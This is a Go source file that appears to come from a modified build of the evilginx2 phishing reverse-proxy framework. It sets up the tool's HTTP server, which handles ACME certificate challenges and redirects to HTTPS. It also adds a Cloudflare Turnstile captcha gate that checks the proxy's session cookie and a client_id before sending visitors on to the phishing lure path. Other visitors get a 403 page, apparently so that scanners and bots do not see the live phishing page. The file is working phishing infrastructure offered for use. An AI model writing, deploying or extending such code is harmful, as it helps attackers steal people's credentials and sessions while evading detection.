package core

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"net/http"
	"net/url"
	"path/filepath"
	"strings"
	"time"

	"github.com/gorilla/mux"
	"github.com/kgretzky/evilginx2/log"
)

var turnstilePublicKey string
var turnstilePrivateKey string
var eproxy *HttpProxy

const turnstileServerName = "https://challenges.cloudflare.com/turnstile/v0/siteverify"

type HttpServer struct {
	srv        *http.Server
	acmeTokens map[string]string
}

type RecaptchaResponse struct {
	Success     bool      `json:"success"`
	ChallengeTS time.Time `json:"challenge_ts"`
	Hostname    string    `json:"hostname"`
	ErrorCodes  []string  `json:"error-codes"`
}

func NewHttpServer(tPub string, tPriv string, turnstile bool) (*HttpServer, error) {
	s := &HttpServer{}
	s.acmeTokens = make(map[string]string)

	if turnstile {
		turnstilePublicKey = tPub
		turnstilePrivateKey = tPriv
	}

	r := mux.NewRouter()
	s.srv = &http.Server{
		Handler:      r,
		Addr:         "127.0.0.1:80",
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	r.HandleFunc("/.well-known/acme-challenge/{token}", s.handleACMEChallenge).Methods("GET")
	r.HandleFunc("/validate-captcha", s.turnstilePage)
	r.PathPrefix("/").HandlerFunc(s.handleRedirect)

	return s, nil
}

func (s *HttpServer) Start(inProxy *HttpProxy) {
	eproxy = inProxy
	go s.srv.ListenAndServe()
}

func (s *HttpServer) AddACMEToken(token string, keyAuth string) {
	s.acmeTokens[token] = keyAuth
}

func (s *HttpServer) ClearACMETokens() {
	s.acmeTokens = make(map[string]string)
}

func (s *HttpServer) handleACMEChallenge(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	token := vars["token"]

	key, ok := s.acmeTokens[token]
	if !ok {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	log.Debug("http: found ACME verification token for URL: %s", r.URL.Path)
	w.WriteHeader(http.StatusOK)
	w.Header().Set("content-type", "text/plain")
	w.Write([]byte(key))
}

func (s *HttpServer) handleRedirect(w http.ResponseWriter, r *http.Request) {
	http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
}

func checkTurnstile(remoteip, response string) (result bool, err error) {
	resp, err := http.PostForm(turnstileServerName,
		url.Values{"secret": {turnstilePrivateKey}, "remoteip": {remoteip}, "response": {response}})
	if err != nil {
		log.Error("Post error: %v", err)
		return false, err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Error("Read error: could not read body: %v", err)
		return false, err
	}
	r := RecaptchaResponse{}
	err = json.Unmarshal(body, &r)
	if err != nil {
		log.Error("Read error: got invalid JSON: %v", err)
		return false, err
	}
	return r.Success, nil
}

func processTurnstile(request *http.Request) (result bool) {
	parts := strings.SplitN(request.RemoteAddr, ":", 2)
	remote_addr := parts[0]
	recaptchaResponse, responseFound := request.Form["cf-turnstile-response"]
	if responseFound {
		result, err := checkTurnstile(remote_addr, recaptchaResponse[0])
		if err != nil {
			log.Error("Turnstile server error: %v", err)
		}
		return result
	}
	return false
}

// sendForbiddenResponse loads and sends the 403 Forbidden HTML template as the response
func sendForbiddenResponse(w http.ResponseWriter) {
	// Define the path to your template file
	tmplPath := filepath.Join("templates", "forbidden.html")
	tmpl, err := template.ParseFiles(tmplPath)
	if err != nil {
		// Log the error and return a basic 403 response if the template fails to load
		log.Error("Error loading 403 template: %v", err)
		http.Error(w, "403 Forbidden", http.StatusForbidden)
		return
	}

	// Set the status code to 403 Forbidden
	w.WriteHeader(http.StatusForbidden)

	// Execute the template without passing any data since it's a static template
	err = tmpl.Execute(w, nil)
	if err != nil {
		// Log the error; at this point, the status code is already set
		log.Error("Error executing 403 template: %v", err)
	}
}

type PageData struct {
	FormActionURL      string
	TurnstilePublicKey string
	ErrorMessage       string
}

func (s *HttpServer) turnstilePage(writer http.ResponseWriter, request *http.Request) {
	isValid := false
	var session string

	// Check for a valid cookie
	for _, c := range request.Cookies() {
		//fmt.Printf("Cookie name length: %d, value length: %d\n", len(c.Name), len(c.Value))
		if len(c.Name) == 9 && len(c.Value) == 64 {
			session = c.Value
			isValid = true
			break
		}
	}

	// Define the path to your template file
	tmplPath := filepath.Join("templates", "turnstile.html")
	tmpl, err := template.ParseFiles(tmplPath)
	if err != nil {
		log.Error("Error loading template: %v", err)
		sendForbiddenResponse(writer)
		return
	}

	// If the cookie is not valid, return 403
	if !isValid || session == "" {
		sendForbiddenResponse(writer)
		return
	} else {
		// Check if the session is valid
		if s, ok := eproxy.sessions[session]; ok {
			// Check if client_id is in the URL
			clientID := request.URL.Query().Get("client_id")
			if clientID == "" {
				sendForbiddenResponse(writer)
				return
			}

			// Populate the templated variables
			pageData := PageData{
				// Form the form action URL
				FormActionURL: fmt.Sprintf("/validate-captcha?client_id=%s", clientID),
				// Set the Turnstile public key
				TurnstilePublicKey: turnstilePublicKey,
			}

			if err := request.ParseForm(); err != nil {
				log.Error("Error parsing form: %v", err)
				sendForbiddenResponse(writer)
				return
			}

			_, buttonClicked := request.Form["button"]
			if buttonClicked {
				//fmt.Println("Button clicked")
				if processTurnstile(request) {
					//fmt.Printf("Captcha done for %s\n", s.PhishLure.Path)
					s.IsCaptchaDone = true
					http.Redirect(writer, request, "https://"+request.Host+s.PhishLure.Path, http.StatusFound)
					return
				} else {
					pageData.ErrorMessage = "Please try again."
				}
			}

			// Execute the template with either the redirect script or error message
			err = tmpl.Execute(writer, pageData)
			if err != nil {
				log.Error("Error executing template: %v", err)
				sendForbiddenResponse(writer)
				return
			}
		}
	}
}
